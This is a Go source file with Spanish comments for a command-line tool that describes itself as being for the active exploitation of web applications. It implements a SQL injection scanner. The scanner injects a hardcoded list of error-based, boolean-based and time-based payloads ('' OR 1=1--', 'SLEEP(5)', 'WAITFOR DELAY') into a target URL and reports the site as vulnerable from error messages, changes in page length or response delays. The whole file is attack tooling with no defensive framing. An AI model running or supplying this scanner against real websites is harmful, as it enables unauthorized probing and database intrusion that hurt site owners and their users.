// FICHERO: ataque-web.go
package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	
	"strings"
	"time"

	"github.com/spf13/cobra"
)

// --- TIPOS DE DATOS Y PAYLOADS ---

type SQLiPayload struct {
	Payload     string
	Description string
	Technique   string // "error", "boolean", "time"
}

var sqliPayloads = []SQLiPayload{
	{"'", "Error-Based: Comilla simple", "error"},
	{"' OR 1=1--", "Boolean-Based: Condición verdadera", "boolean"},
	{"' AND 1=2--", "Boolean-Based: Condición falsa", "boolean"},
	{"' WAITFOR DELAY '0:0:5'--", "Time-Based: SQL Server (5s)", "time"},
	{"' OR SLEEP(5)--", "Time-Based: MySQL (5s)", "time"},
	{"' OR pg_sleep(5)--", "Time-Based: PostgreSQL (5s)", "time"},
}




// --- LÓGICA DE LOS COMANDOS ---

func NewWebAttackCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "web",
		Short: "Ejecuta ataques contra aplicaciones web (SQLi, XSS, etc.)",
		Long:  "Un conjunto de herramientas para la explotación activa de vulnerabilidades en aplicaciones web.",
	}
	cmd.AddCommand(newSqliScanCmd())
	
	return cmd
}

// --- SUBCOMANDO: sqli-scan ---
func newSqliScanCmd() *cobra.Command {
	var targetURL string
	cmd := &cobra.Command{
		Use:   "sqli-scan",
		Short: "Escanea un parámetro de URL en busca de vulnerabilidades de Inyección SQL",
		Long: `Reemplaza la palabra clave 'FUZZ' en una URL con varios payloads de SQLi
para detectar vulnerabilidades basadas en errores, booleanas y de tiempo.`,
		Run: func(cmd *cobra.Command, args []string) {
			if targetURL == "" || !strings.Contains(targetURL, "FUZZ") {
				log.Fatal("Error: Se requiere una URL (-u) que contenga la palabra clave 'FUZZ' para marcar el punto de inyección.")
			}
			runSqliScan(targetURL)
		},
	}
	cmd.Flags().StringVarP(&targetURL, "url", "u", "", "URL del objetivo con 'FUZZ' en el punto de inyección (ej: 'http://test.com/product.php?id=1FUZZ')")
	return cmd
}

func runSqliScan(targetURL string) {
	log.Printf("Iniciando escaneo de Inyección SQL en: %s", targetURL)

	originalURL := strings.Replace(targetURL, "FUZZ", "", 1)
	originalResp, err := http.Get(originalURL)
	if err != nil {
		log.Fatalf("Error al obtener la respuesta original de %s: %v", originalURL, err)
	}
	originalBody, _ := io.ReadAll(originalResp.Body)
	originalResp.Body.Close()
	originalLength := len(originalBody)

	for _, p := range sqliPayloads {
		testURL := strings.Replace(targetURL, "FUZZ", p.Payload, 1)
		fmt.Printf("[*] Probando payload [%s]: %s\n", p.Description, p.Payload)

		startTime := time.Now()
		resp, err := http.Get(testURL)
		if err != nil {
			log.Printf("  -> Error en la petición: %v", err)
			continue
		}
		duration := time.Since(startTime)

		switch p.Technique {
		case "error":
			bodyBytes, _ := io.ReadAll(resp.Body)
			bodyString := string(bodyBytes)
			if strings.Contains(strings.ToLower(bodyString), "sql syntax") || strings.Contains(strings.ToLower(bodyString), "unclosed quotation mark") {
				fmt.Printf("  [!] ¡VULNERABLE! (Error-Based): Se encontró un mensaje de error de SQL en la respuesta.\n")
			}
			resp.Body.Close()
		case "boolean":
			bodyBytes, _ := io.ReadAll(resp.Body)
			currentLength := len(bodyBytes)
			if currentLength != originalLength {
				fmt.Printf("  [!] ¡POSIBLEMENTE VULNERABLE! (Boolean-Based): La longitud de la página cambió de %d a %d bytes.\n", originalLength, currentLength)
			}
			resp.Body.Close()
		case "time":
			resp.Body.Close() // No necesitamos leer el cuerpo para el ataque de tiempo
			if duration.Seconds() > 4.5 {
				fmt.Printf("  [!] ¡VULNERABLE! (Time-Based): La respuesta tardó %.2f segundos.\n", duration.Seconds())
			}
		}
	}
	log.Println("Escaneo de SQLi completado.")
}

